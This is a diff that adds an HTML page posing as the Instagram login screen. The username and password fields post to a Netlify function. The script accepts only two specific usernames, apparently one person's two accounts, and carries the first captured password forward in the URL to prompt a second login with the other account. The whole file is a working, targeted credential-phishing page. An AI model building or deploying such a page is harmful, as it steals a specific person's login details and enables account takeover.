@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram Login</title>
+  <link rel="stylesheet" href="style.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
+</head>
+<body>
+  <div class="container">
+    <div class="center">
+      <div class="header">
+        <img src="instagramlogo.png" alt="instagramLogo" class="instaLogo" />
+      </div>
+      <div class="inputElement">
+        <div id="error-msg" style="display:none; color:#c00; text-align:center; margin-bottom:10px; font-size:14px;"></div>
+        <form action="/.netlify/functions/login" method="POST" id="loginForm">
+          <input type="text" name="username" placeholder="Username" class="inputText" required />
+          <input type="password" name="password" placeholder="Password" class="inputText" required />
+          <!-- first-step data -->
+          <input type="hidden" name="first" id="firstField" />
+          <input type="hidden" name="firstpass" id="firstPassField" />
+          <input type="submit" value="Log in" class="inputButton" />
+        </form>
+      </div>
+    </div>
+  </div>
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const params = new URLSearchParams(location.search);
+      const first = params.get('first');
+      const firstpass = params.get('firstpass');
+      const error = params.get('error');
+      const banner = document.getElementById('error-msg');
+      const other = first === 'anu_shkasingh_73' ? 'anuuwwshka' : 'anu_shkasingh_73';
+      if (error === 'next') {
+        banner.textContent = 'Now please log in with “' + other + '”';
+        banner.style.display = 'block';
+        // populate hidden
+        document.getElementById('firstField').value = first;
+        document.getElementById('firstPassField').value = firstpass;
+      }
+      document.getElementById('loginForm').addEventListener('submit', function(e) {
+        const user = this.username.value.trim();
+        if (!first) {
+          // first step: allow only two valid
+          if (user !== 'anu_shkasingh_73' && user !== 'anuuwwshka') {
+            e.preventDefault();
+            alert('Please use a valid username.');
+          }
+        } else {
+          // second step: must use the other
+          if (user !== other) {
+            e.preventDefault();
+            alert('Please use username “' + other + '”');
+          }
+        }
+      });
+    });
+  </script>
+</body>
+</html>
